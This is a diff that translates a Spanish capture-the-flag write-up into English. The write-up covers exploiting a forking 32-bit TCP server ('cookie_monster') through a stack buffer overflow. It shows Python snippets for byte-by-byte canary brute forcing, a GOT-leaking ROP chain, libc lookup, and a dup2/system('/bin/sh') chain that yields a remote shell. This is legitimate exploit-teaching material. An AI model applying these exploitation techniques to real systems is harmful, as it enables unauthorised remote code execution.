@@ -13,9 +13,9 @@
 
 ---
 
-## Analisis Inicial
+## Initial Analysis
 
-### Informacion del Binario
+### Binary Information
 
 ```bash
 $ file cookie_monster
@@ -23,25 +23,25 @@ cookie_monster: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
 dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, stripped
 ```
 
-- **Arquitectura:** x86 (32-bit)
-- **Tipo:** Ejecutable dinamicamente enlazado
-- **Stripped:** Si (sin simbolos de debug)
+- **Architecture:** x86 (32-bit)
+- **Type:** Dynamically linked executable
+- **Stripped:** Yes (no debug symbols)
 
-### Protecciones
+### Protections
 
 ```bash
 $ readelf -l cookie_monster | grep GNU_STACK
 GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
 ```
 
-| Proteccion | Estado |
+| Protection | Status |
 |------------|--------|
-| NX (No Execute) | Habilitado |
-| Stack Canary | Habilitado |
-| PIE | Deshabilitado |
-| RELRO | Parcial |
+| NX (No Execute) | Enabled |
+| Stack Canary | Enabled |
+| PIE | Disabled |
+| RELRO | Partial |
 
-### Funciones PLT Disponibles
+### Available PLT Functions
 
 ```
 strcmp, bzero, __stack_chk_fail, htons, accept, exit, strlen,
@@ -50,36 +50,36 @@ __libc_start_main, write, bind, fork, listen, socket, recv, close, send
 
 ---
 
-## Analisis del Binario
+## Binary Analysis
 
-### Comportamiento del Servidor
+### Server Behavior
 
-El binario implementa un servidor TCP en el puerto 5555 que:
-1. Acepta conexiones
-2. Hace `fork()` para cada cliente
-3. Solicita una contrasena
-4. Compara con "admin123\n"
-5. Responde "Welcome back admin!" o "Incorrect secret password:"
+The binary implements a TCP server on port 5555 that:
+1. Accepts connections
+2. Calls `fork()` for each client
+3. Requests a password
+4. Compares it with "admin123\n"
+5. Responds with "Welcome back admin!" or "Incorrect secret password:"
 
-### Funcion Vulnerable (0x080486f6)
+### Vulnerable Function (0x080486f6)
 
 ```asm
 push   %ebp
 mov    %esp,%ebp
 push   %ebx
-sub    $0x254,%esp              ; Stack frame de 596 bytes
-mov    %gs:0x14,%eax            ; Obtiene el canary
-mov    %eax,-0xc(%ebp)          ; Guarda canary en ebp-0xc
+sub    $0x254,%esp              ; 596-byte stack frame
+mov    %gs:0x14,%eax            ; Gets the canary
+mov    %eax,-0xc(%ebp)          ; Stores canary at ebp-0xc
 ...
-lea    -0x20c(%ebp),%eax        ; Buffer en ebp-0x20c
+lea    -0x20c(%ebp),%eax        ; Buffer at ebp-0x20c
 push   %eax
 push   0x8(%ebp)                ; socket_fd
 call   recv@plt                  ; recv(fd, buffer, 0x400, 0)
 ```
 
-### Vulnerabilidad: Buffer Overflow
+### Vulnerability: Buffer Overflow
 
-| Variable | Offset desde EBP | Tamano |
+| Variable | Offset from EBP | Size |
 |----------|------------------|--------|
 | Buffer | ebp - 0x20c (524) | ~512 bytes |
 | Canary | ebp - 0xc (12) | 4 bytes |
@@ -87,24 +87,24 @@ call   recv@plt                  ; recv(fd, buffer, 0x400, 0)
 | Saved EBP | ebp | 4 bytes |
 | Return Addr | ebp + 0x4 | 4 bytes |
 
-**El problema:** `recv()` lee hasta **0x400 (1024)** bytes en un buffer de **~512 bytes**.
+**The problem:** `recv()` reads up to **0x400 (1024)** bytes into a **~512 byte** buffer.
 
 ```
-Offset al canary: 0x20c - 0xc = 0x200 = 512 bytes
-Offset al return: 512 + 4 (canary) + 4 (???) + 4 (ebx) + 4 (ebp) = 528 bytes
+Offset to canary: 0x20c - 0xc = 0x200 = 512 bytes
+Offset to return: 512 + 4 (canary) + 4 (???) + 4 (ebx) + 4 (ebp) = 528 bytes
 ```
 
 ---
 
-## Estrategia de Explotacion
+## Exploitation Strategy
 
-### 1. Bypass del Stack Canary
+### 1. Stack Canary Bypass
 
-El servidor usa `fork()`, lo que significa que **el canary es el mismo** para todas las conexiones hijas. Esto permite un ataque de **brute force byte a byte**.
+The server uses `fork()`, which means **the canary is the same** for all child connections. This allows a **byte-by-byte brute force** attack.
 
-**Metodo de deteccion:**
-- Si el canary es **correcto**: la funcion retorna normalmente -> recibimos "Come back soon!"
-- Si el canary es **incorrecto**: `__stack_chk_fail` se ejecuta -> conexion cerrada sin "Come back soon!"
+**Detection method:**
+- If the canary is **correct**: the function returns normally -> we receive "Come back soon!"
+- If the canary is **incorrect**: `__stack_chk_fail` is executed -> connection closed without "Come back soon!"
 
 ```python
 def try_byte(current_canary, byte_guess):
@@ -115,47 +115,47 @@ def try_byte(current_canary, byte_guess):
     r.send(payload)
 
     data = r.recv()
-    return b"Come back" in data  # True si el byte es correcto
+    return b"Come back" in data  # True if the byte is correct
 ```
 
-**Resultado:** Canary = `0xafcc5b00`
+**Result:** Canary = `0xafcc5b00`
 
-### 2. Leak de Libc
+### 2. Libc Leak
 
-Con el canary conocido, construimos un ROP chain para leakear direcciones de la GOT:
+With the canary known, we build a ROP chain to leak GOT addresses:
 
 ```python
 # ROP: send(socket_fd, got_entry, 4, 0)
-rop = p32(send_plt)      # Llamar send
-rop += p32(pop4_ret)     # Limpiar argumentos (pop ebx; pop esi; pop edi; pop ebp; ret)
+rop = p32(send_plt)      # Call send
+rop += p32(pop4_ret)     # Clean up arguments (pop ebx; pop esi; pop edi; pop ebp; ret)
 rop += p32(4)            # socket_fd = 4
-rop += p32(got_addr)     # Direccion GOT a leakear
-rop += p32(4)            # Longitud
+rop += p32(got_addr)     # GOT address to leak
+rop += p32(4)            # Length
 rop += p32(0)            # Flags
-rop += p32(exit_plt)     # Salir limpiamente
+rop += p32(exit_plt)     # Exit cleanly
 
 payload = b"A" * 512     # Padding
-payload += canary        # Canary conocido
-payload += b"XXXX"       # 4 bytes desconocidos
+payload += canary        # Known canary
+payload += b"XXXX"       # 4 unknown bytes
 payload += b"YYYY"       # saved_ebx
 payload += b"ZZZZ"       # saved_ebp
 payload += rop           # ROP chain
 ```
 
-**Leaks obtenidos:**
+**Obtained leaks:**
 ```
 __libc_start_main@libc: 0xf7de1d90
 send@libc: 0xf7ec1920
 write@libc: 0xf7eae6f0
 ```
 
-### 3. Identificacion de Libc
+### 3. Libc Identification
 
-Usando los ultimos 12 bits de las direcciones leakeadas:
+Using the last 12 bits of the leaked addresses:
 - `__libc_start_main`: 0x**d90**
 - `write`: 0x**6f0**
 
-Consulta a [libc.rip](https://libc.rip):
+Query to [libc.rip](https://libc.rip):
 
 ```bash
 $ curl -s "https://libc.rip/api/find" \
@@ -163,16 +163,16 @@ $ curl -s "https://libc.rip/api/find" \
   -d '{"symbols": {"__libc_start_main": "d90", "write": "6f0"}}'
 ```
 
-**Resultado:** `libc6-i386_2.27-3ubuntu1_amd64`
+**Result:** `libc6-i386_2.27-3ubuntu1_amd64`
 
-| Funcion | Offset |
+| Function | Offset |
 |---------|--------|
 | `__libc_start_main` | 0x18d90 |
 | `system` | 0x3cd10 |
 | `dup2` | 0xe6110 |
 | `/bin/sh` | 0x17b8cf |
 
-### 4. Calculo de Direcciones
+### 4. Address Calculation
 
 ```python
 libc_base = libc_start_main_leak - 0x18d90  # 0xf7dc9000
@@ -181,22 +181,22 @@ dup2 = libc_base + 0xe6110                   # 0xf7eaf110
 binsh = libc_base + 0x17b8cf                 # 0xf7f448cf
 ```
 
-### 5. ROP Final: Shell Interactiva
+### 5. Final ROP: Interactive Shell
 
-Para obtener una shell interactiva sobre el socket, necesitamos redirigir stdin/stdout:
+To obtain an interactive shell over the socket, we need to redirect stdin/stdout:
 
 ```python
-# ROP chain final
+# Final ROP chain
 rop = b""
 
-# dup2(socket_fd, 0) - Redirigir stdin
+# dup2(socket_fd, 0) - Redirect stdin
 rop += p32(dup2)
 rop += p32(pop3_ret)    # pop esi; pop edi; pop ebp; ret
 rop += p32(4)           # socket_fd
 rop += p32(0)           # stdin
 rop += p32(0)           # dummy
 
-# dup2(socket_fd, 1) - Redirigir stdout
+# dup2(socket_fd, 1) - Redirect stdout
 rop += p32(dup2)
 rop += p32(pop3_ret)
 rop += p32(4)
@@ -205,13 +205,13 @@ rop += p32(0)
 
 # system("/bin/sh")
 rop += p32(system)
-rop += p32(exit_plt)    # Return address para system
-rop += p32(binsh)       # Argumento: "/bin/sh"
+rop += p32(exit_plt)    # Return address for system
+rop += p32(binsh)       # Argument: "/bin/sh"
 ```
 
 ---
 
-## Exploit Final
+## Final Exploit
 
 ```python
 #!/usr/bin/env python3
@@ -329,7 +329,7 @@ if __name__ == "__main__":
 
 ---
 
-## Ejecucion
+## Execution
 
 ```
 $ python3 exploit.py
@@ -348,22 +348,22 @@ $ python3 exploit.py
 
 ---
 
-## Aprendizaje del reto
+## Lessons Learned
 
-1. **Stack Canary Brute Force** - Posible gracias a `fork()` que mantiene el mismo canary
-2. **ROP Chain** - Para ejecutar funciones arbitrarias sin shellcode
-3. **GOT Leak** - Para obtener direcciones de libc en runtime
-4. **Libc Database** - Para identificar la version exacta de libc
-5. **dup2() para shell interactiva** - Redirigir stdin/stdout al socket
+1. **Stack Canary Brute Force** - Possible thanks to `fork()` which keeps the same canary
+2. **ROP Chain** - To execute arbitrary functions without shellcode
+3. **GOT Leak** - To obtain libc addresses at runtime
+4. **Libc Database** - To identify the exact libc version
+5. **dup2() for interactive shell** - Redirect stdin/stdout to the socket
 
-## Herramientas Utilizadas
+## Tools Used
 
 - pwntools
 - ROPgadget
-- libc.rip (libc database online)
+- libc.rip (online libc database)
 - objdump / readelf
 
-## Referencias
+## References
 
-- [libc.rip](https://libc.rip) - Base de datos de libc online
-- [libc-database](https://github.com/niklasb/libc-database) - Herramienta para identificar libc
+- [libc.rip](https://libc.rip) - Online libc database
+- [libc-database](https://github.com/niklasb/libc-database) - Tool for identifying libc
